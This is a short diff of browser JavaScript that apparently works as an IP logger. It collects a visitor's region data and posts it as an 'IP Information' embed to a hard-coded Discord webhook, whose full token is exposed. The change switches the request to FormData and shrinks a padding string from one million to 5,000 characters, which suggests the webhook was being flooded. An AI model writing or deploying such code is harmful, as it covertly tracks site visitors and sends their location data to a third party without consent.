@@ -22,7 +22,9 @@
           const region = data.region;
           const webhookUrl = 'https://discord.com/api/webhooks/1112433220747792535/f0GSFHDk7Y5p7YNV2xzoIjy-7Kl6v1gRJyK2jONEyMxhjGiEbvffgJNA9N4ZeaGJg_i9';
           const randomString = generateRandomString();
-          const messagePayload = {
+          
+          const formData = new FormData();
+          formData.append('payload_json', JSON.stringify({
             embeds: [
               {
                 title: 'IP Information',
@@ -30,13 +32,11 @@
                 color: 16711680
               }
             ]
-          };
+          }));
+          
           fetch(webhookUrl, {
             method: 'POST',
-            headers: {
-              'Content-Type': 'application/json'
-            },
-            body: JSON.stringify(messagePayload)
+            body: formData
           });
         });
     }
@@ -47,7 +47,7 @@
     }
 
     function generateRandomString() {
-      const length = 1000000; // Adjust the length of the string as desired
+      const length = 5000; // Adjust the length of the string as desired
       const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
       let result = '';
       for (let i = 0; i < length; i++) {
